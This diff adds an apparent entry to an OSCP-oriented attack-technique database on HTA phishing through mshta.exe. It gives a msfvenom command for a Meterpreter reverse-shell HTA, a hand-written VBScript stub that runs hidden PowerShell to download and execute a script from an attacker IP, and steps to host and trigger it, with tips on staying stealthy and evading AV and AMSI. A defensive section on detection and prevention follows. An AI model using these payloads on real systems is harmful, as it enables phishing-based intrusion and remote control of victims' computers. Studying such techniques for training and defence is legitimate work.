@@ -1,0 +1,100 @@
+{
+  "id": "hta-mshta-attack",
+  "name": "HTA - mshta.exe Execution",
+  "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=443 -f hta-psh -o evil.hta",
+  "description": "An HTML Application (.hta) is HTML plus embedded VBScript/JScript that Windows runs through the trusted mshta.exe binary with full local privileges - no browser sandbox. Host the .hta on a web server; when the user browses to it and confirms the mshta prompt, the script executes a PowerShell payload. A living-off-the-land initial-access vector where Office macros are blocked.",
+  "type": "payload",
+  "platform": "windows",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "msfvenom",
+    "mshta",
+    "python"
+  ],
+  "tags": [
+    "client-side",
+    "phishing",
+    "hta",
+    "mshta",
+    "lolbin",
+    "powershell"
+  ],
+  "category": "Exploitation",
+  "subcategory": "Client-Side Attacks",
+  "certifications": [
+    "OSCP"
+  ],
+  "primary_cert": "OSCP",
+  "source": "OSCP PEN-200 Chapter 11: Client-Side Attacks",
+  "examples": [
+    {
+      "label": "Generate an HTA with a PowerShell payload",
+      "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.128 LPORT=443 -f hta-psh -o evil.hta"
+    },
+    {
+      "label": "Manual HTA stub (VBScript runs PowerShell)",
+      "command": "<html><head><script language=\"VBScript\">\nSet o = CreateObject(\"Wscript.Shell\")\no.Run \"powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.128/r.ps1')\"\n</script></head><body></body></html>"
+    },
+    {
+      "label": "Host it, then trigger on the target",
+      "command": "python3 -m http.server 80\nmshta.exe http://192.168.49.128/evil.hta"
+    }
+  ],
+  "notes": "mshta.exe is a signed Microsoft LOLBIN, so the download and run often slip past application-control that only blocks unknown EXEs. msfvenom -f hta-psh is the fast path but is heavily signatured - a hand-written HTA calling a staged PowerShell cradle is stealthier. Set up your listener (nc / metasploit multi/handler) before sending the link.",
+  "references": [
+    {
+      "title": "OffSec PEN-200 - Client-Side Attacks",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    },
+    {
+      "title": "LOLBAS - mshta.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "client-recon-fingerprint",
+      "rel": "prereq",
+      "note": "Fingerprint the target first to confirm OS version and browser/PDF reader so you can pick the right client-side payload."
+    },
+    {
+      "id": "msf-multi-handler",
+      "rel": "next",
+      "note": "Catch the msfvenom Meterpreter shell with multi/handler — hta-psh is a staged payload so bare nc won't work."
+    },
+    {
+      "id": "office-macro-payload",
+      "rel": "alternative",
+      "note": "Use a Word macro when the pretext is a document rather than a link."
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1566.002",
+    "T1218.005",
+    "T1059.001"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "HTA (HTML Application) files execute via mshta.exe as a hybrid HTML+VBScript/JScript application with Internet Explorer's scripting engine \u2014 but without the browser security sandbox. mshta.exe is a signed Microsoft binary, so it's often whitelisted. HTA files can execute arbitrary code including ActiveX objects, WScript.Shell, and PowerShell invocations. Delivered via phishing link or as an attachment, clicking the file triggers full code execution.",
+    "prerequisites": "Target clicks an HTA link or attachment. mshta.exe present and not blocked (LOLBAS). Internet Explorer scripting engine installed (all Windows versions through 10; IE mode available on 11). The HTA is served via HTTP or sent as attachment.",
+    "impact": "T1566.002 Phishing: Spearphishing Link + T1218.005 System Binary Proxy Execution: Mshta + T1059.001 PowerShell. Initial access via client-side code execution. mshta.exe bypasses most application control focused on EXE/DLL. VBScript/JScript code execution with user context. Commonly used to stage a PowerShell download and execute payload.",
+    "detection": "Sysmon Event 1: mshta.exe spawning cmd.exe or powershell.exe. Event 4688: mshta.exe with .hta URL or file path in command line. EDR: mshta.exe making outbound network connections or spawning shells. Browser proxy log: download of .hta file. Email gateway: .hta attachment detected.\nUnusual inbound email with attachments or URLs followed by new process execution or suspicious document behavior; correlate email metadata, file creation, and network activity (DET0070/AN0188).\nMail logs with suspicious file writes or outbound connections after email delivery (AN0189).\nMac Mail app anomalies: attachments saved and immediately executed, or Safari/Preview launching files from email (AN0190).\nOffice documents with macros spawning child processes; correlate Office logs with execution and network connections (AN0191).\nAnomalous IdP login attempts from suspicious email invitations or fake SSO prompts; correlate with MFA bypass and geo anomalies (AN0192).\nSaaS-delivered phishing (chat/collaboration): anomalous link clicks, suspicious uploads, token misuse after delivery (AN0193).",
+    "artifacts": "Sysmon Event 1: mshta.exe \u2192 cmd.exe/powershell.exe child process | Event 4688: mshta.exe execution | EDR: LOLBAS abuse alert for mshta.exe | Proxy log: .hta file downloaded | Email log: .hta attachment",
+    "prevention": "Block mshta.exe via WDAC or AppLocker (high-value target \u2014 very few legitimate enterprise uses). Email gateway: block .hta attachments. Web proxy: block .hta file downloads. Attack Surface Reduction rule: 'Block Office applications from creating child processes'. Disable IE mode on non-IE-dependent environments.\nAntivirus/Antimalware: Auto-quarantine suspicious files.\nAudit: Scan systems and configurations for weaknesses.\nNetwork Intrusion Prevention: Use NIP systems to scan and block malicious email attachments or links.\nRestrict Web-Based Content: Block access to websites or attachment types (.scr, .exe, .pif, .cpl) used for phishing if not needed for business.\nSoftware Configuration: Use anti-spoofing/email authentication (SPF, DKIM, DMARC) to filter messages based on sender domain validity and message integrity.\nUser Training: Train users to identify social engineering techniques and phishing emails.",
+    "evasion": "Host HTA via HTTPS to evade HTTP content inspection. Use obfuscated VBScript to evade script-based AV/AMSI. Split payload across multiple HTA fetches. Use a legitimate-looking HTA (with functioning content) while running payload in background.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1566/002/",
+      "https://attack.mitre.org/techniques/T1218/005/",
+      "https://attack.mitre.org/techniques/T1059/001/"
+    ],
+    "misconfiguration": "mshta.exe not blocked by application control. Email gateway allows .hta attachments. No ASR rule blocking mshta child process spawning. AMSI not enforced for Internet Explorer scripting engine.",
+    "vulnerable_config": "# mshta.exe not in AppLocker/WDAC deny list:\nGet-AppLockerPolicy -Effective | Where-Object {$_.Rules | Select-String 'mshta'}\n# No output \u2192 mshta.exe unrestricted\n\n# Email gateway allows .hta attachments:\n# Exchange: Get-TransportRule | Where-Object {$_.AttachmentExtensionMatchesWords -contains 'hta'}\n# No transport rule blocking .hta = attachments delivered",
+    "secure_config": "# Block mshta.exe via WDAC deny rule:\n# Add path rule: deny C:\\Windows\\System32\\mshta.exe\n# Or publisher rule: deny applications published by Microsoft signed with mshta characteristics\n\n# AppLocker EXE rule:\nNew-AppLockerPolicy -RuleType Publisher -FilePath C:\\Windows\\System32\\mshta.exe -Action Deny\n\n# ASR rule (Defender):\nSet-MpPreference -AttackSurfaceReductionRules_Ids 'D4F940AB-401B-4EFC-AADC-AD5F3C50688A' -AttackSurfaceReductionRules_Actions Enabled\n# \u2192 Block Office from creating child processes\n\n# Exchange transport rule: block .hta attachments\nNew-TransportRule -Name 'Block HTA Attachments' -AttachmentExtensionMatchesWords 'hta' -RejectMessageEnhancedStatusCode '5.7.1' -RejectMessageReasonText 'HTA files are blocked'"
+  }
+}
